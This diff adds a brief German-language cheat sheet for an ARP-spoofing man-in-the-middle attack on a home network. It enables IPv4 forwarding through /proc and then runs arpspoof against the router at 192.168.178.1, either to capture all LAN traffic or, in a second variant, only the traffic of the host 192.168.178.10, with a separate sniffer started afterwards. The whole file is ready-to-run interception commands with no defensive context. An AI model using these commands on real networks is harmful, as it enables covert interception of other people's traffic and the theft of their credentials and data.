@@ -1,0 +1,29 @@
+gezielte umleitung des netzwerkverkehrs
+danach seperaten sniffer starten
+
+ziel suchen (router)
+ping 192.168.178.1
+
+ip forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+es handelt sich hierbei um das gateway somit wird der sämtlicher verkehr mitgeschnitten
+arpspoof -i eth0 192.168.178.1
+
+
+
+ODER
+
+
+
+bestimmtes ziel suchen
+ping 192.168.178.1
+ping 192.168.178.10
+
+ip forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+hier wird nun nur der verkehr eines gerätes mitgeschnitten
+arpspoof -i eth0 -t 192.168.178.10 192.168.178.1
